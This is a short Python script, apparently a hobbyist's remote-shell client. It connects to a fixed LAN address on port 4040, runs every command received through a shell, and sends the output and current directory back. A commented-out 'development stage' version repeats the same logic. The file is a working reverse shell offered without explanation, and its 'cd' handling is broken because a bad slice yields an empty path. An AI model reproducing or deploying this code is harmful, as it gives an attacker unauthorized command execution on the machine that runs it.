import os
import socket
import subprocess

ip = '192.168.0.115'
port = 4040
s = socket.socket()

s.connect((ip, port))

while True:
    data = s.recv(1024)
    print(data)
    if data[0:2].decode('utf-8') == 'cd':
        os.chdir(data[3:0].decode('utf-8'))
    elif data[:].decode('utf-8') == 'tes':
        print('berhasil quit')
        s.close()
        break
    elif len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cmdout = cmd.stdout.read() + cmd.stderr.read()
        cmdout_str = str(cmdout, 'utf-8')
        s.send(str.encode(cmdout_str + str(os.getcwd()) + '> '))
        print(cmdout_str)

# development stage

# while True:
#     data = s.recv(1024)
#     if data[:2].decode('utf-8') == 'cd':
#         os.chdir(data[3:].decode('utf-8').strip())
#     elif data.strip().decode('utf-8') == 'tes':
#         print('berhasil quit')
#         s.close()
#         break
#     elif len(data) > 0:
#         command = data.decode('utf-8')
#         cmd = subprocess.Popen(command.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         cmdout, cmderr = cmd.communicate()
#         cmdout_str = cmdout.decode('utf-8') + cmderr.decode('utf-8')
#         s.send(str.encode(cmdout_str + str(os.getcwd()) + '> '))
#         print(cmdout_str)
    

